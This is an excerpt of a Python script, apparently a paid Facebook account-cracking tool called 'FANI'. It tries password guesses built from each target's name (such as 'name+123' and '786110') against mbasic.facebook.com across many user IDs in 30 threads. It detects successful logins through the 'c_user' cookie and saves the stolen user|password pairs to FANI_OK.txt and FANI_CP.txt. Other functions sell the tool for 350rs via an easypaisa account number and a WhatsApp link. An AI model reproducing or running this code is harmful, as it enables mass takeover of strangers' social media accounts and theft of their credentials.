...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mFANI_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mFANI_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Fani Menu ")
	    irfan()
...
def irfan():
    ...
    print(' [E] exit ')
    print('')
    _irfan___ = input(' [?] Choose option : ')
    if _irfan___ in ('1', '01'):
        __xxx__().irfanx(id)
    if _irfan___ in ('2', '02'):
        os.system('python dm.py')
    if _irfan___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[FANI] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [FANI-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('FANI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [FANI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('FANI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with irfanfani(max_workers=30) as fanimalik:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            pwx = ["786110"]
                        fanimalik.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\reasypaisa Account Number 03434631334\n')
        print('\rAccount Name M Mubashir\n')
        print
        print
        ...
        os.system('am start https://wa.me/+923434631334?text=' + tks)
...
def bnsreg():
    ...
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~FANI=="
    print
    print ('\n\x1b[1;97m Your Token: \x1b[97m' + id + '\n')
    print
    print('\rTool Price 350rs\n')
    print
    print('\reasy paisa Account Number 03434631334\n')
    print('\rAccount Name M Mubashir\n')
    print
    print('\rPayment Successfully Msg Or Token Send\n')
    print
